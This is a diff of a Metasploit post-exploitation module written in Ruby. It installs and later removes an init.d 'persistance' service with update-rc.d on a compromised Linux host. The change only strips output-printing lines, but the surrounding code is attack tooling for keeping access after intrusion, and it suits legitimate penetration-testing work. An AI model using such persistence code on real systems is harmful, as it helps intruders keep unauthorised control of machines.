@@ -139,7 +139,6 @@ class MetasploitModule < Msf::Post
 #
 def ls_stage1
 
-  output=''
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']          # /etc/init.d
@@ -221,10 +220,7 @@ def ls_stage1
         cmd_exec("chmod +x #{script_check}")
         vprint_good("Update init.d service status (symlinks) ..")
         Rex::sleep(1.0)
-        output = cmd_exec("update-rc.d persistance defaults # 97 03")
-        vprint_line("")
-        vprint_line(output)
-        vprint_line("")
+        cmd_exec("update-rc.d persistance defaults # 97 03")
       else
         vprint_error("%red" + "init.d script: #{script_check} not found ..")
         vprint_error("Persistence not achieved ..")
@@ -254,7 +250,6 @@ end
 #
 def ls_stage2
 
-  output=''
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']        # /etc/init.d
@@ -288,10 +283,7 @@ def ls_stage2
       Rex::sleep(1.0)
       cmd_exec("rm -f #{init}/persistance")
       vprint_good("Delete persistence service (symlinks) ..")
-      output = cmd_exec("update-rc.d persistance remove")
-      vprint_line("")
-      vprint_line(output)
-      vprint_line("")
+      cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
 
     #
